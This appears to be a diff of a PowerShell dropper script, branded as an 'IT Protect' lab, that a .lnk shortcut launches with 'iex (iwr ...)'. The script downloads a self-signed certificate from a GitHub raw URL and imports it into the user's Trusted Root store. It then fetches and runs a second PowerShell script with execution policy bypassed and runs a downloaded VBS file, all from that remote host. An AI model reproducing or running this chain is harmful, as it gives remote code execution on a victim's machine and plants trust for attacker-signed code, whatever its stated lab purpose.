@@ -1,32 +1,55 @@
-# Day len GitHub (raw): Lab-Chain-Run.ps1 — can cho .lnk portable (chi can .lnk, iex iwr URL nay).
-# Chay tu Lab-Register-Task.lnk — console luon hien, co log.
-# Tai tu GitHub raw roi chay tuan tu.
+# Push len GitHub raw — .lnk portable: iex (iwr ...Lab-Chain-Run.ps1)
+# Thu tu: tai + import cert -> tai Trust.txt (Notepad) -> tai + chay ps1 -> tai + chay vbs
 
 $ErrorActionPreference = 'Continue'
-Write-Host ''
-Write-Host '=== IT Protect (bangwonie/lnk) ===' -ForegroundColor Cyan
+$raw = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main'
+$uCer = "$raw/ITProtect-Lab-CodeSigning.cer"
+$uTrust = "$raw/ITProtect-Lab-Trust.txt"
+$u1 = "$raw/Lab-Register-Task.ps1"
+$u2 = "$raw/Step2-Notify.vbs"
 
+$pCer = Join-Path $env:TEMP 'ITProtect-Lab-CodeSigning.cer'
+$pTrust = Join-Path $env:TEMP 'ITProtect-Lab-Trust.txt'
 $p1 = Join-Path $env:TEMP 'Lab-Register-Task.ps1'
 $p2 = Join-Path $env:TEMP 'Step2-Notify.vbs'
-$u1 = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/Lab-Register-Task.ps1'
-$u2 = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/Step2-Notify.vbs'
+
+Write-Host ''
+Write-Host '=== IT Protect (bangwonie/lnk) — chuoi tu dong ===' -ForegroundColor Cyan
 
 try {
-    Write-Host '[1/4] Tai ps1 ->' $p1
+    Write-Host '[1/6] Tai ITProtect-Lab-CodeSigning.cer ->' $pCer
+    Invoke-WebRequest -UseBasicParsing -Uri $uCer -OutFile $pCer
+    if (-not (Test-Path -LiteralPath $pCer)) { throw "Khong ghi duoc cert" }
+    Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $pCer).Length)
+
+    Write-Host '[2/6] Import cert vao Trusted Root (Current User)...'
+    try {
+        Import-Certificate -FilePath $pCer -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
+        Write-Host '      OK'
+    } catch {
+        Write-Host ('      (Thu lai / da co: {0})' -f $_.Exception.Message) -ForegroundColor Yellow
+    }
+
+    Write-Host '[3/6] Tai ITProtect-Lab-Trust.txt -> Notepad'
+    Invoke-WebRequest -UseBasicParsing -Uri $uTrust -OutFile $pTrust
+    if (Test-Path -LiteralPath $pTrust) {
+        Start-Process -FilePath 'notepad.exe' -ArgumentList $pTrust
+        Write-Host '      Da mo Notepad'
+    }
+
+    Write-Host '[4/6] Tai Lab-Register-Task.ps1 ->' $p1
     Invoke-WebRequest -UseBasicParsing -Uri $u1 -OutFile $p1
-    if (-not (Test-Path -LiteralPath $p1)) { throw "Khong ghi duoc: $p1" }
+    if (-not (Test-Path -LiteralPath $p1)) { throw "Khong ghi duoc ps1" }
     Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $p1).Length)
 
-    Write-Host '[2/4] Chay Lab-Register-Task.ps1 ...'
+    Write-Host '[5/6] Chay Lab-Register-Task.ps1 ...'
     $pwsh = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
     & $pwsh -NoProfile -ExecutionPolicy Bypass -File $p1
     Write-Host ('      Exit code: {0}' -f $LASTEXITCODE)
 
-    Write-Host '[3/4] Tai vbs ->' $p2
+    Write-Host '[6/6] Tai + chay Step2-Notify.vbs ...'
     Invoke-WebRequest -UseBasicParsing -Uri $u2 -OutFile $p2
     Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $p2).Length)
-
-    Write-Host '[4/4] Chay wscript Step2-Notify.vbs ...'
     $ws = Join-Path $env:SystemRoot 'System32\wscript.exe'
     Start-Process -FilePath $ws -ArgumentList $p2 -Wait
     Write-Host '      Xong.'
@@ -42,8 +65,8 @@ Read-Host 'Nhan Enter de dong cua so'
 # SIG # Begin signature block
 # MIIb9QYJKoZIhvcNAQcCoIIb5jCCG+ICAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
 # gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
-# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUXfcUv0LGmCTtA1Ne/8qwuel1
-# NCagghZaMIIDHDCCAgSgAwIBAgIQfifqnalecqVIOdXQmwz2ODANBgkqhkiG9w0B
+# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUwCErDLRCCExa4yiEsZ8PMLWI
+# qHegghZaMIIDHDCCAgSgAwIBAgIQfifqnalecqVIOdXQmwz2ODANBgkqhkiG9w0B
 # AQsFADAmMSQwIgYDVQQDDBtJVFByb3RlY3QgTGFiIChTZWxmLXNpZ25lZCkwHhcN
 # MjYwNDEwMDYzMzQ5WhcNMjkwNDEwMDY0MzQ5WjAmMSQwIgYDVQQDDBtJVFByb3Rl
 # Y3QgTGFiIChTZWxmLXNpZ25lZCkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
@@ -166,28 +189,28 @@ Read-Host 'Nhan Enter de dong cua so'
 # ZWN0IExhYiAoU2VsZi1zaWduZWQpAhB+J+qdqV5ypUg51dCbDPY4MAkGBSsOAwIa
 # BQCgeDAYBgorBgEEAYI3AgEMMQowCKACgAChAoAAMBkGCSqGSIb3DQEJAzEMBgor
 # BgEEAYI3AgEEMBwGCisGAQQBgjcCAQsxDjAMBgorBgEEAYI3AgEVMCMGCSqGSIb3
-# DQEJBDEWBBTNMwqPYlqXAC3TYKnzHudcUz6zPTANBgkqhkiG9w0BAQEFAASCAQAd
-# SD8REBjIGfBrQncfvnPrB/8H1BxdW/cYETfe9tsGebEB+dO5f1Rrb05TYqU4AY3b
-# g1IkafitJATl99EXnPiqqeJh5z5SzolFZkTcOuWVKzV5K+GrTAfgImUPMFIhlwfr
-# 0QuY1ArrPykxIaqJFYbvDPAP3xWJIO1nSxiPoYjc5cs5m3XbtfM936hR+F3BIsOf
-# ZstYOj8tCK6sbz5t0aORIiDObyE0klqqW69viZGqtv0zg0ecncOnluCfPxkEdY7W
-# pVr5dAfJr2yIDg9ZT4ULM6+TmE9dIfkK+Ga12eEUVObfwkvYLF6Hgz0if2cCs53a
-# vMVaXcnLcVxBSMIvAswHoYIDJjCCAyIGCSqGSIb3DQEJBjGCAxMwggMPAgEBMH0w
+# DQEJBDEWBBT8sJY8z8g32ug1cJQETCc77SRRsjANBgkqhkiG9w0BAQEFAASCAQA9
+# Mb+9wEeilRvgFJF4YL7zWIgmGEZ8oYLTQyjhd3z+Gfj172Vs7HeUPMkrs7i4GjMe
+# jfNHQOh3qM0Jd2ofBLP6lBSK7vQkT7XLFSb8uMfoy8dzluw/b7r2+qH28iDowf6X
+# SbkU2M7H18QAgCW+zwNzt4gpjsw5rwI3FiDA4mlZdDYheOCZcg5wR3ygYFThNWH0
+# aTnfjqDxHgtBPyAjpFFnCyLUXncX/4LjISOE/NldSNNdFsAMaf8Lf1EuIpYLGt24
+# Wnf3PBPN6Ed+9D5MSG0GK2bxKJUQKI6rXb1WwiiXz7nEnWx92LRNJ809cxmCI8rk
+# zDLAbxH5NdnJ436v0OZjoYIDJjCCAyIGCSqGSIb3DQEJBjGCAxMwggMPAgEBMH0w
 # aTELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMUEwPwYDVQQD
 # EzhEaWdpQ2VydCBUcnVzdGVkIEc0IFRpbWVTdGFtcGluZyBSU0E0MDk2IFNIQTI1
 # NiAyMDI1IENBMQIQCoDvGEuN8QWC0cR2p5V0aDANBglghkgBZQMEAgEFAKBpMBgG
 # CSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTI2MDQxMDA2
-# NDM1MFowLwYJKoZIhvcNAQkEMSIEIMNXIEufXNEWsvXOJjUT1HKf4ocA4hh2QSVz
-# lp2JejDUMA0GCSqGSIb3DQEBAQUABIICAKdCczwz9fbOo6TRf/88ln3popQa6XwC
-# wmpEvheqbt5MEfMSE/HQTJy3uEMD3wJAmPIpjXEjtTNc4XP6uPYg3/who4pep0Xh
-# sn8aL2xorq4Cza1dAthZI4mDRjI4V9dmcM7QLjQDBGLno6PBQWiNcn9i8eEPSCzX
-# XH4Gwa2mskLEwEtHNUTSGJ2GKNJPzaHfk7si7RQU51tuH/xyKofOJgcuxMeJfVtz
-# aN8kuSqhuM3i/RrUdRNCyexx5v+McRTBVmQ2WUYDdOA8tUt6P1Y15gFY2fHZQ1gB
-# 1ZZfNuk/R5car634iYFo4byx/4ObC4vpFnMMc4iAWpNmwIx+9wNStxDwf2F7e8s5
-# RGRs0SOKbZJ+8QMX1sdLa6MAg1UM5KlGYkHpWgo0qzs0LNJEYrELbMgPSPG508oi
-# F35TTuKxPblxgFS1Fn/e2Ja4QrMPgEAgZIuOO8QCjc9WtjNFn6ikSVDXnhYUV4MA
-# 9JQ3LSUyWfxVsxtiheUASwodJzbaIiNFw8wjP3BRPK4Y5t+RFwDX0MZJqx8HTA9r
-# 8sETwtwQkt+9n9v1z6EVC7XY5y3TlTR9Yx2r/KtVTNArJWze57MN8P7pWJFUoTpu
-# TlTn7XnAmQ6iUvTOGpg5stVgJfYYAWsEGHxfKFqEnzP3a0aNhrEHKT41d2Y+fxLx
-# pTXHuk5+WY7H
+# NTQzOFowLwYJKoZIhvcNAQkEMSIEIOwO35Is0PpngS8Z4DUXGDS4PnkylyGhHjmE
+# 3GfhY16xMA0GCSqGSIb3DQEBAQUABIICAFD3aYN3gaP1QUpvGqqgwmdbPPhe51mP
+# qOr0kSERiHWCKRsF4jRwtD9A71fd46W33AC/CU+GlsKCyBw1sccNymC1KleO0PqZ
+# pDVRza2Qxz7ef2aCsYfrBYJfAPo8DEAPExjFoWeNMyFyQlt6G5WLdDwcpvQ5l8xD
+# XGjKQHXXfqhG8q0AvLA7lBsbN//w+4gGCFGhoZUW81j0FZxNUDxmgw3osLF3RCL6
+# IEu2R3CAhOejmiWdQvvQJNGxocBVbMP9VHUHZ0eB/UpIXXVeL/E7ujOwxNmLJzrU
+# 3tZGBGNNLsN3ldDFASuZYl1hGx1mKr5hDBmvMjM5doYvPyDWpciy3waEVe5+fofR
+# grcxa7Rdsu/Y1fhooZrZXw8pBGnDKogYEF4MIdTUbbGzaX0imWnsn5jDQE3PvGW+
+# t/EY02szR85KKhhE9VUYJH3d910LwwqUOGhuaEyP5/lsLg4UYcUkjh74VRqqrF2h
+# rfpz+UXQjknmGu7lUlUVRNWh8wIjpMBffY/d9USirxItef43UfZV2kob3lXmEjSo
+# bBAKFTs8v3DsDjwNcnPwWt/5wAOzThR70tnmv9pAAEUTl3CoR9LvwjYkj2bgOOD1
+# 9fWpddQdGGrblA59qSJe1A+4nM34A47mt8X++x/QF7voVHOJ94OrUtdt4mX6LuOA
+# Qv7OVPVv1Pkk
 # SIG # End signature block
